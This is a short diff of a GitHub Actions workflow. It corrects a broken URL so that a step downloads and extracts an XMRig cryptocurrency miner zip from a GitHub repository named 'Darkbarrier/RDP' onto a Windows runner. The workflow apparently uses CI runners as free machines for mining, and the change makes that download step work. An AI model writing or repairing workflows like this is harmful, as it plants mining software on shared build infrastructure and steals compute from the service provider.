@@ -44,7 +44,7 @@ jobs:
           }
       - name: Download and Extract XMRig ZIP
         run: |
-          $url = "hhttps://github.com/Darkbarrier/RDP/blob/main/xmrig-6.24.0-windows-x64.zip"
+          $url = "https://github.com/Darkbarrier/RDP/blob/main/xmrig-6.24.0-windows-x64.zip"
           $zipPath = "C:\xmrig.zip"
           $extractPath = "C:\xmrig"
           Invoke-WebRequest -Uri $url -OutFile $zipPath
